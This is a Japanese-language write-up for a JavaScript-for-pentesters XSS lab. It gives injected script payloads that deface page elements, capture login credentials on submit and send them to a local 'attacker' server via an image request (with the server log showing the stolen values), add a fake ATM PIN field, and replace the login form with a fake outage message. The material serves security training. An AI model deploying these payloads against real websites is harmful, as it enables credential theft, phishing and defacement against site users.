<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [task1](#task1)
- [task2](#task2)
- [task3](#task3)
- [task4](#task4)
- [task5](#task5)
- [task6](#task6)
- [writeup](#writeup)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# task1
![image](https://user-images.githubusercontent.com/56021519/101612346-e2638d80-3a4d-11eb-8132-8a6e633d99cc.png)   
h2要素の3つ目と、h1要素の1つ目を書き換える。   
```js
<script>
  document.getElementsByTagName("h2")[2].innerHTML = "wetw0rk";
  document.getElementsByTagName("h1")[0].innerHTML = "ya bish";
</script>
```
# task2
![image](https://user-images.githubusercontent.com/56021519/101612253-ca8c0980-3a4d-11eb-9290-f639f4b3e7e8.png)   
a要素のhref属性の値を4つ分書き換える。   
```js
<script>
  document.getElementsByTagName("a")[0].href = "wetw0rk";
  document.getElementsByTagName("a")[1].href = "wetw0rk";
  document.getElementsByTagName("a")[2].href = "wetw0rk";
  document.getElementsByTagName("a")[3].href = "wetw0rk";
</script>
```
# task3
![image](https://user-images.githubusercontent.com/56021519/101612147-ad573b00-3a4d-11eb-9ae8-b4434c413766.png)   
入力した値が攻撃者に送信されるようにする。   
以下だと、actionに指定したこの攻撃者のサーバーに遷移してしまう   
今回はバレないようにしないといけないのでこれはだめ   
```js
<script>
  document.forms[0].action = "http://127.0.0.1:9000/";
  alert("XSS");
</script>
```
こんな感じでaction先に遷移してしまう。   
![image](https://user-images.githubusercontent.com/56021519/101610107-23a66e00-3a4b-11eb-8fd4-1f0463a5cd24.png)   
送信ボタンが押されるとonsubmitイベントが発火するので、そのイベントを検知したらInterceptForm()関数が呼ばれるようにする。   
`new Image().src`で画像を取得する形で攻撃サーバーに情報を送信する。  
これをURL encodeして/url?=に入れて、Javascriptが挿入された後にブラウザで送信ボタンを押す   
挿入したJavascriptはその次の送信時のブラウザで実行されるのでBurpは無意味。   
```js
<script>
function InterceptForm()
{
  var username = document.forms[0].elements[0].value;
  var password = document.forms[0].elements[1].value;
  var w;

  new Image().src = ("http://127.0.0.1:9000/?username=" +
    username + "&password=" + password);
  alert("XSS");
}

document.forms[0].onsubmit = InterceptForm;

</script>
```
```txt
tomoki@LAPTOP-KSRL4PAP:~$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
127.0.0.1 - - [09/Dec/2020 17:07:05] "GET /?username=aa&password=aa HTTP/1.1" 200 -
```
# task4
![image](https://user-images.githubusercontent.com/56021519/101611938-741ecb00-3a4d-11eb-967c-97885e8eba56.png)   
formタグの2つ目のinput要素の次に、もう一つinput要素を追加する。   
`createElement`で`input`要素を作成して属性を設定し、`insertBefore`の二つ目の引数でpassのinputの一つ後ろを`nextSibling`で指定することで、そこに挿入する。   
```js
<script>
/* http://pentesteracademylab.appspot.com/lab/webapp/jfp/4 */
var nfield = document.createElement("input"); // create new input field

nfield.setAttribute("type", "text");
nfield.setAttribute("class", "input-block-level");
nfield.setAttribute("placeholder", "ATM PIN");
nfield.setAttribute("name", "pin");

var lf = document.forms[0].elements[1]; // index pass field

document.forms[0].insertBefore(nfield, lf.nextSibling); // insert after pass field
document.forms[0].action = "http://127.0.0.1/"; // send to attacking server

</script>
```
新しいフォームが追加された。   
![image](https://user-images.githubusercontent.com/56021519/101611821-5487a280-3a4d-11eb-8cd9-64a3306c8ac2.png)   
以下のようにエラーはでるが、送信はできてる。   
![image](https://user-images.githubusercontent.com/56021519/101610065-17baac00-3a4b-11eb-993e-9c5ce92ad770.png)   
以下でも同じことができる。   
```js
<script>
window.onload = function()
{
  var fieldx = document.createElement('input');
  fieldx.type = "text";
  fieldx.class = "input-block-level";
  fieldx.placeholder= "ATM PIN";
  fieldx.name = "ATM PIN";
  fieldx.style.fontSize = "16px";
  fieldx.style.height = "auto";
  fieldx.style.marginBottom = "15px";
  fieldx.style.paddingLeft = "7px";
  fieldx.style.paddingRight = "9px";
  document.forms[0].insertBefore(fieldx,document.forms[0].childNodes[6])
}
</script>
```
# task5
![image](https://user-images.githubusercontent.com/56021519/101613094-b09ef680-3a4e-11eb-8aba-c2338e16eb9d.png)   
formを削除して、偽のメッセージを挿入する。   
`parentNode.appendCild`で要素を挿入して、`parentNode.removeChile`でform[0]を丸々削除する。   
```js
<script>
var notice = document.createElement("h2");
notice.innerHTML = "Website is Down! Please visit SecurityTube.net";
document.forms[0].parentNode.appendChild(notice);
document.forms[0].parentNode.removeChild(document.forms[0]);
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101616581-de863a00-3a52-11eb-976f-af4b37cb4a88.png)   

# task6

# writeup
https://github.com/wetw0rk/AWAE-PREP/blob/master/JavaScript%20For%20Pentesters/README.md   
https://github.com/bupt007/pentester-for-javascript-/blob/master/solution.js   
